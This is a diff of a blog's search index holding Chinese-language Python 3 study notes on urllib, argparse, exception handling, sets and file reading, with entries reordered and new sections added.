@@ -1,39 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Python3-argparse</title>
-    <url>//560821a385be.html</url>
-    <content><![CDATA[<h2 id="Argparse"><a href="#Argparse" class="headerlink" title="Argparse"></a>Argparse</h2><p>用于解析命令行参数和选项</p>
-<h3 id="ArgumentParser"><a href="#ArgumentParser" class="headerlink" title="ArgumentParser"></a>ArgumentParser</h3><p>作为解析器，用来包含将命令行解析成Python数据类型的全部信息</p>
-<p>语法：</p>
-<p><strong>argparse.ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=argparse.HelpFormatter, prefix_chars=’-‘, fromfile_prefix_chars=None, argument_default=None, conflict_handler=’error’, add_help=True, allow_abbrev=True, exit_on_error=True)</strong></p>
-<p><strong>prog</strong>: 程序的名称，默认为<code>sys.argv[0]</code></p>
-<p><strong>usage</strong>: 描述程序用途的字符串（默认值：从添加到解析器的参数生成）</p>
-<p><strong>description</strong>: 在参数帮助文档之前显示的文本（默认值：None）</p>
-<p><strong>epilog</strong>: 在参数帮助文档之后显示的文本（默认值：None）</p>
-<p><strong>parents</strong>: 一个<code>ArgumentParser</code>对象的列表，他们的参数也包含在内</p>
-<p><strong>formatter_class</strong>: 用于自定义帮助文档输出格式的类</p>
-<p><strong>prefix_chars</strong>: 可选参数的前缀字符集合（默认值：’ - ‘ ）</p>
-<p><strong>fromfile_prefix_chars</strong>: 当需要从文件中读取其他参数时，用于标识文件名的前缀字符集合（默认值：None）</p>
-<p><strong>argument_default</strong>: 参数的全局默认值（默认值： None）</p>
-<p><strong>conflict_handler</strong>: 解决冲突选项的策略（通常是不必要的）</p>
-<p><strong>add_help</strong>: 为解析器添加一个 -h/–help 选项（默认值： True）</p>
-<p><strong>allow_abbrev</strong>: 如果缩写是无歧义的，则允许缩写长选项 （默认值：True）</p>
-<p><strong>exit_on_error</strong>: 决定当错误发生时是否让 <code>ArgumentParser</code> 附带错误信息退出。 (默认值: True)</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser = argparse.ArgumentParser(epilog=<span class="string">&#x27;\tExample: \r\npython3 &#x27;</span>+sys.argv[<span class="number">0</span>]+<span class="string">&quot; -u http://baidu.com&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Python库</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python3-urllib</title>
     <url>//e28b0e650137.html</url>
-    <content><![CDATA[<h1 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h1><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><h3 id="urlopen"><a href="#urlopen" class="headerlink" title="urlopen"></a>urlopen</h3><p><code>urllib.request.urlope()</code>参数用于对目标<code>URL</code>的访问</p>
+    <content><![CDATA[<h1 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h1><p>urllib是Python自带模块，通过该模块可以实现HTTP网络请求</p>
+<h2 id="urllib-request"><a href="#urllib-request" class="headerlink" title="urllib.request"></a>urllib.request</h2><p><code>urllib.request</code>子模块定义了请求HTTP的方法和类</p>
+<h3 id="urlopen"><a href="#urlopen" class="headerlink" title="urlopen"></a>urlopen</h3><p><code>urllib.request.urlope()</code>参数用于对目标<code>URL</code>的访问</p>
 <p>语法：</p>
 <p><strong>urllib.request.urlopen(url, data=None, [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)</strong></p>
 <ul>
@@ -58,7 +30,7 @@
 
 
 
-<h3 id="request-1"><a href="#request-1" class="headerlink" title="request"></a>request</h3><p><code>urllib.request.Request</code>用于构建一个请求</p>
+<h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p><code>urllib.request.Request</code>用于构建一个请求</p>
 <p>语法：</p>
 <p><strong>urllib.request.Request(url, data=None, headers={}, origin_req_host=None, unverifiable=False, method=None)</strong></p>
 <ul>
@@ -80,12 +52,14 @@
 
 
 <h3 id="BaseHandler"><a href="#BaseHandler" class="headerlink" title="BaseHandler"></a>BaseHandler</h3><p><code>urllib.request.BaseHandler</code>用来构造Request的一些高级特性</p>
-<h2 id="response"><a href="#response" class="headerlink" title="response"></a>response</h2><p>urlopen返回对象提供方法：</p>
+<h2 id="urllib-response"><a href="#urllib-response" class="headerlink" title="urllib.response"></a>urllib.response</h2><p><code>urllib.response</code>子模块定义了返回HTTP的方法和类</p>
+<p>urlopen返回对象提供方法：</p>
 <p>read() , readline() ,readlines() , fileno() , close() ：对HTTPResponse类型数据进行操作</p>
 <p>info()：返回HTTPMessage对象，表示远程服务器返回的头信息</p>
 <p>getcode()：返回Http状态码。如果是http请求，200请求成功完成;404网址未找到</p>
 <p>geturl()：返回请求的url</p>
-<h2 id="parse"><a href="#parse" class="headerlink" title="parse"></a>parse</h2><h3 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h3><p><code>urllib.parse.urlparse</code>用于解析URL</p>
+<h2 id="urllib-parse"><a href="#urllib-parse" class="headerlink" title="urllib.parse"></a>urllib.parse</h2><p><code>urllib.parse</code>该子模块用于解析URL和引用URL</p>
+<h3 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h3><p><code>urllib.parse.urlparse</code>用于解析UR</p>
 <p>语法：</p>
 <p><strong>urllib.parse.urlparse(urlstring, scheme=’’, allow_fragments=True)</strong></p>
 <ul>
@@ -107,7 +81,40 @@
 
 
 
-<h2 id="robotparser"><a href="#robotparser" class="headerlink" title="robotparser"></a>robotparser</h2><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    urllib.request.urlopen(url)</span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e.reason)</span><br><span class="line">    print(e.status)</span><br></pre></td></tr></table></figure>
+<h2 id="urllib-robotparser"><a href="#urllib-robotparser" class="headerlink" title="urllib.robotparser"></a>urllib.robotparser</h2><p><code>urllib.robotparser</code>该子模块用于解析<code>robots.txt</code>文件</p>
+<h2 id="urllib-error"><a href="#urllib-error" class="headerlink" title="urllib.error"></a>urllib.error</h2><p><code>urllib.error</code>该子模块包含了有关HTTP异常的类</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    urllib.request.urlopen(url)</span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e.reason)</span><br><span class="line">    print(e.status)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3模块</category>
+      </categories>
+      <tags>
+        <tag>Python3模块</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-argparse</title>
+    <url>//560821a385be.html</url>
+    <content><![CDATA[<h2 id="Argparse"><a href="#Argparse" class="headerlink" title="Argparse"></a>Argparse</h2><p>用于解析命令行参数和选项</p>
+<h3 id="ArgumentParser"><a href="#ArgumentParser" class="headerlink" title="ArgumentParser"></a>ArgumentParser</h3><p>作为解析器，用来包含将命令行解析成Python数据类型的全部信息</p>
+<p>语法：</p>
+<p><strong>argparse.ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=argparse.HelpFormatter, prefix_chars=’-‘, fromfile_prefix_chars=None, argument_default=None, conflict_handler=’error’, add_help=True, allow_abbrev=True, exit_on_error=True)</strong></p>
+<p><strong>prog</strong>: 程序的名称，默认为<code>sys.argv[0]</code></p>
+<p><strong>usage</strong>: 描述程序用途的字符串（默认值：从添加到解析器的参数生成）</p>
+<p><strong>description</strong>: 在参数帮助文档之前显示的文本（默认值：None）</p>
+<p><strong>epilog</strong>: 在参数帮助文档之后显示的文本（默认值：None）</p>
+<p><strong>parents</strong>: 一个<code>ArgumentParser</code>对象的列表，他们的参数也包含在内</p>
+<p><strong>formatter_class</strong>: 用于自定义帮助文档输出格式的类</p>
+<p><strong>prefix_chars</strong>: 可选参数的前缀字符集合（默认值：’ - ‘ ）</p>
+<p><strong>fromfile_prefix_chars</strong>: 当需要从文件中读取其他参数时，用于标识文件名的前缀字符集合（默认值：None）</p>
+<p><strong>argument_default</strong>: 参数的全局默认值（默认值： None）</p>
+<p><strong>conflict_handler</strong>: 解决冲突选项的策略（通常是不必要的）</p>
+<p><strong>add_help</strong>: 为解析器添加一个 -h/–help 选项（默认值： True）</p>
+<p><strong>allow_abbrev</strong>: 如果缩写是无歧义的，则允许缩写长选项 （默认值：True）</p>
+<p><strong>exit_on_error</strong>: 决定当错误发生时是否让 <code>ArgumentParser</code> 附带错误信息退出。 (默认值: True)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser = argparse.ArgumentParser(epilog=<span class="string">&#x27;\tExample: \r\npython3 &#x27;</span>+sys.argv[<span class="number">0</span>]+<span class="string">&quot; -u http://baidu.com&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -848,6 +855,130 @@
       </tags>
   </entry>
   <entry>
+    <title>Python3-异常</title>
+    <url>//44917d227716.html</url>
+    <content><![CDATA[<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>程序运行过程当中，不可避免的会出现一些错误</p>
+<p>这些错误在过程中，我们称之为异常</p>
+<h2 id="处理异常"><a href="#处理异常" class="headerlink" title="处理异常"></a>处理异常</h2><p>程序运行时出现异常，目的并不是让我们的程序直接终止<br>我们可以在出现异常时，编写代码对异常进行处理<br>避免因为一个异常导致程序的终止</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> 语句</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		代码块（可能出现错误的语句）</span><br><span class="line">	<span class="comment"># 如果except后不跟任何内容，会捕获所有的异常</span></span><br><span class="line">	<span class="comment"># 如果跟着异常的类型，只会捕获相关异常</span></span><br><span class="line">	<span class="comment"># 如果既想捕获所有异常，又想捕获某一异常，可以写多个except语句</span></span><br><span class="line">	<span class="comment"># Exception 是所有异常的父类，如果except后跟的是Exception，他也会捕获到所有的异常</span></span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		代码块（没出现错误时执行的语句）</span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		代码块（无论是否有异常，该代码总会执行）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把异常用as的方式赋值给变量</span></span><br><span class="line"><span class="keyword">except</span> 异常 <span class="keyword">as</span> x</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h2><p>如果在函数中对异常进行处理，异常便不会影响程序<br>如果不对函数的异常进行处理，异常会传递到函数的调用处<br>出现异常后，所有异常信息会保存在一个专门保存异常的对象中<br>异常传播时，会调用这个保存异常的对象<br>比如 ：<br>    ZeroDivisionError类的对象专门用来表示除0的异常<br>    NameError类的对象专门用来处理变量错误的异常</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">可以使用 <span class="keyword">raise</span> 语句来抛出异常</span><br><span class="line"><span class="comment"># raise用于向外部抛出异常，后边可以跟一个异常类，或异常类的实例</span></span><br><span class="line"><span class="comment"># raise Exception</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">if</span> a &lt; <span class="number">0</span> <span class="keyword">or</span> b &lt; <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">raise</span> Exception(<span class="string">&#x27;两个参数中不能有负数&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 也可以自定义异常类，只需要创建一个类继承Exception即可</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>一般用于对程序某个时刻必须满足的条件进行验证</p>
+<p>因为<code>assert</code>条件为<code>False</code>才会执行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">assert</span> a &lt; <span class="number">0</span> <span class="keyword">and</span> b &lt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 这里or是找True，所以不合适，应该使用and，找False</span></span><br><span class="line"><span class="comment"># a &lt; 0为True,所以不抛出异常,b&lt;0为False，所以抛出异常</span></span><br><span class="line">可以写成</span><br><span class="line"><span class="keyword">assert</span> a &gt; <span class="number">0</span> <span class="keyword">and</span> b &gt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以用try语句控制</span></span><br><span class="line">a = -<span class="number">123</span></span><br><span class="line">b = <span class="number">456</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    add(a,b)</span><br><span class="line"><span class="keyword">except</span> AssertionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入有误：&quot;</span>, e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(add(a,b))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="内置异常"><a href="#内置异常" class="headerlink" title="内置异常"></a>内置异常</h2><ul>
+<li>Exception：所有异常的父类<ul>
+<li>SystemExit：解释器请求退出</li>
+<li>KeyboardInterrupt：用户中断执行</li>
+<li>GeneratorExit：生成器发生异常来通知退出</li>
+<li>Exception：常规错误的父类<ul>
+<li>StopIteration：迭代器没有更多的值</li>
+<li>StopAsyncIteration：必须通过异步迭代器对象的__anext__()方法引发以停止迭代</li>
+<li>ArithmeticError：所有数值计算错误的基类<ul>
+<li>FloatingPointError：浮点数计算错误</li>
+<li>OverflowError：数值运算超出最大限制</li>
+<li>ZeroDivisionError：除(或取模)零所有数据类型</li>
+</ul>
+</li>
+<li>AssertionError：当<code>assert</code>语句判定<code>False</code>，断言失败</li>
+<li>AttributeError：对象中没有这个属性</li>
+<li>BufferError：与缓冲区相关的操作引发</li>
+<li>EOFError：没有内建输入，到达EOF标记</li>
+<li>ImportError：导入模块失败<ul>
+<li>ModuleNotFoundError：找不到模块</li>
+</ul>
+</li>
+<li>LookupError：无效数据查询<ul>
+<li>IndexError：序列中没有此索引</li>
+<li>KeyError：映射中没有这个键</li>
+</ul>
+</li>
+<li>MemoryError：内存溢出错误</li>
+<li>NameError：未声明，初始化对象<ul>
+<li>UnboundLocalError：访问未初始化的本地变量</li>
+</ul>
+</li>
+<li>OSError：操作系统错误<ul>
+<li>BlockingIOError：操作将阻塞对象设置为非阻塞操作</li>
+<li>ChildProcessError：子进程上的操作失败</li>
+<li>ConnectionError：与链接相关的异常<ul>
+<li>BrokenPipeError：在关闭写入的套接字上写入</li>
+<li>ConnectionAbortedError：链接被对方终止</li>
+<li>ConnectionRefusedError：链接被对方拒绝</li>
+<li>ConnectionResetError：链接被对方重置</li>
+</ul>
+</li>
+<li>FileExistsError：创建已存在的文件或者目录</li>
+<li>FileNotFoundError：请求文件或者目录不存在</li>
+<li>InterruptedError：系统调用被输入信号中断</li>
+<li>IsADirectoryError：在目录上请求文件</li>
+<li>NotADirectoryError：在不是目录事物上请求目录操作</li>
+<li>PermissionError：没有访问权限</li>
+<li>ProcessLookupError：进程不存在</li>
+<li>TimeoutError：系统函数在系统级别超时</li>
+</ul>
+</li>
+<li>ReferenceError：弱引用试图访问已经垃圾回收了的对象</li>
+<li>RuntimeError：一般的运行时错误<ul>
+<li>NotImplementedError：尚未实现的方法</li>
+<li>RecursionError：解释器检测到超出最大递归深度</li>
+</ul>
+</li>
+<li>SyntaxError：Python语法错误<ul>
+<li>IndentationError：缩进错误<ul>
+<li>TabError：Tab和空格混用</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SystemError：系统错误</li>
+<li>TypeError：类型错误</li>
+<li>ValueError：传入无效的参数<ul>
+<li>UnicodeError：Unicode 相关的错误<ul>
+<li>UnicodeDecodeError：Unicode 解码时的错误</li>
+<li>UnicodeEncodeError：Unicode 编码时错误</li>
+<li>UnicodeTranslateError：Unicode 转换时错误</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Warning：警告的错误<ul>
+<li>DeprecationWarning：关于被弃用的特征的警告</li>
+<li>PendingDeprecationWarning：关于构造将来语义会有改变的警告</li>
+<li>RuntimeWarning：可疑的运行行为的警告</li>
+<li>SyntaxWarning：可疑的语法的警告</li>
+<li>UserWarning：用户代码生成的警告</li>
+<li>FutureWarning：有关已弃用功能的警告的基类</li>
+<li>ImportWarning：模块导入时可能出错的警告的基类</li>
+<li>UnicodeWarning：与Unicode相关的警告的基类</li>
+<li>BytesWarning：bytes和bytearray相关的警告的基类</li>
+<li>ResourceWarning：与资源使用相关的警告的基类</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python3-数组</title>
     <url>//dff4ce1f2267.html</url>
     <content><![CDATA[<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
@@ -972,6 +1103,147 @@
 
 
 <h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add() 向集合中添加元素</span></span><br><span class="line">对象名.add(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update() 将一个集合中的元素添加到当前集合中</span></span><br><span class="line"><span class="comment"># update()可以传递序列或字典作为参数，字典只会使用键</span></span><br><span class="line">s2 = <span class="built_in">set</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">对象<span class="number">1.</span>update(对象<span class="number">2</span>)</span><br><span class="line">对象名.update([元素<span class="number">1</span>，元素<span class="number">2.</span>.....])</span><br><span class="line">对象名.update(&#123;key:value,key:value.......&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop()随机删除并返回一个集合中的元素</span></span><br><span class="line">变量 = 对象名.pop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove()删除集合中的指定元素</span></span><br><span class="line">对象名.remove(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear()清空集合</span></span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy()对集合进行浅复制</span></span><br><span class="line">变量 = 对象名.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在对集合做运算时，不会影响原来的集合，而是返回一个运算结果</span></span><br><span class="line"><span class="comment"># 创建两个集合</span></span><br><span class="line">s = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">s2 = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp; 交集运算</span></span><br><span class="line">result = s &amp; s2 <span class="comment"># &#123;3, 4, 5&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># | 并集运算</span></span><br><span class="line">result = s | s2 <span class="comment"># &#123;1,2,3,4,5,6,7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 差集</span></span><br><span class="line">result = s - s2 <span class="comment"># &#123;1, 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^ 异或集 获取只在一个集合中出现的元素</span></span><br><span class="line">result = s ^ s2 <span class="comment"># &#123;1, 2, 6, 7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;= 检查一个集合是否是另一个集合的子集</span></span><br><span class="line"><span class="comment"># 如果a集合中的元素全部都在b集合中出现，那么a集合就是b集合的子集，b集合是a集合超集</span></span><br><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">b = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">result = a &lt;= b <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt; 检查一个集合是否是另一个集合的真子集</span></span><br><span class="line"><span class="comment"># 如果超集b中含有子集a中所有元素，并且b中还有a中没有的元素，则b就是a的真超集，a是b的真子集</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">difference()	返回包含两个或更多集合之间差异的集合。</span><br><span class="line">difference_update()	删除此集合中也包含在另一个指定集合中的项目。</span><br><span class="line">discard()	删除指定项目。</span><br><span class="line">intersection()	返回为两个其他集合的交集的集合。</span><br><span class="line">intersection_update()	删除此集合中不存在于其他指定集合中的项目。</span><br><span class="line">isdisjoint()	返回两个集合是否有交集。</span><br><span class="line">issubset()	返回另一个集合是否包含此集合。</span><br><span class="line">issuperset()	返回此集合是否包含另一个集合。</span><br><span class="line">symmetric_difference()	返回具有两组集合的对称差集的集合。</span><br><span class="line">symmetric_difference_update()	插入此集合和另一个集合的对称差集。</span><br><span class="line">union()	返回包含集合并集的集合。</span><br><span class="line">update()	用此集合和其他集合的并集来更新集合。</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-文件与目录</title>
+    <url>//0571043783b3.html</url>
+    <content><![CDATA[<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>通过python程序对计算机中的各种文件进行增删改查等操作</p>
+<p>I/O (input/output)</p>
+<p>在windows系统使用路径时，可以使用<code>/</code>来代替 <code>\</code><br>或者可以使用 <code>\\ </code>来代替 <code>\</code><br>或者也可以使用原始字符串<code> r&#39;xxx&#39;</code><br>表示路径，可以使用<code>..</code>来返回一级目录</p>
+<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(file, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>, encoding_=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span>, opener=<span class="literal">None</span>)</span><br><span class="line">参数：</span><br><span class="line">	<span class="built_in">open</span>(file) 要打开的文件的名字（路径）</span><br><span class="line">返回值：</span><br><span class="line">	返回一个对象，这个对象就代表了当前打开的文件</span><br><span class="line">    </span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line"><span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># with...as 语句</span></span><br><span class="line"><span class="comment"># 通过with语句，在处理文件时，不论是否抛出异常，都可以保证关闭已经打开的文件</span></span><br><span class="line"><span class="comment"># as后跟自定义变量</span></span><br><span class="line"><span class="comment"># 在with语句中可以直接使用file_obj来做文件操作</span></span><br><span class="line"><span class="comment"># 这个文件只能在with中使用，一旦with结束则文件会自动close()</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="built_in">print</span>(file.read())</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 调用open()来打开一个文件，可以将文件分成两种类型</span></span><br><span class="line"><span class="comment"># 一种，是纯文本文件（使用utf-8等编码编写的文本文件）</span></span><br><span class="line"><span class="comment"># 一种，是二进制文件（图片、mp3、ppt等这些文件）</span></span><br><span class="line"><span class="comment"># open()打开文件时，默认是以文本文件的形式打开的，但是open()默认的编码为None</span></span><br><span class="line"><span class="comment"># encodint可以设置指定文件的编码</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="built_in">print</span>(file.read())</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line">b = file.read()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件</span></span><br><span class="line"><span class="comment"># 如果要读取的文件较大的话，会一次性将文件的内容加载到内存中，容易导致内存泄漏</span></span><br><span class="line"><span class="comment"># 所以不能直接调用read()</span></span><br><span class="line"><span class="comment"># read()可以接收一个size作为参数，该参数用来指定要读取的字符的数量</span></span><br><span class="line"><span class="comment">#   默认值为-1，它会读取文件中的所有字符</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		content = file_obj.read(-<span class="number">1</span>)</span><br><span class="line">		content = file_obj.read(<span class="number">20</span>)</span><br><span class="line">		<span class="built_in">print</span>(content)</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件方法二</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="comment"># 定义一个变量，来保存文件的内容</span></span><br><span class="line">        file_content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			content = file_obj.read(<span class="number">100</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="comment"># print(content,end=&#x27;&#x27;)</span></span><br><span class="line">			<span class="comment"># 利用拼串的方式分块读取内容</span></span><br><span class="line">			file_content += content</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(file_content)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="readline"><a href="#readline" class="headerlink" title="readline()"></a>readline()</h2><p>readline() 该方法可以用来读取一行内容<br>readlines()    该方法用于一行一行读取内容，会一次性把读取到的内容封装到列表中</p>
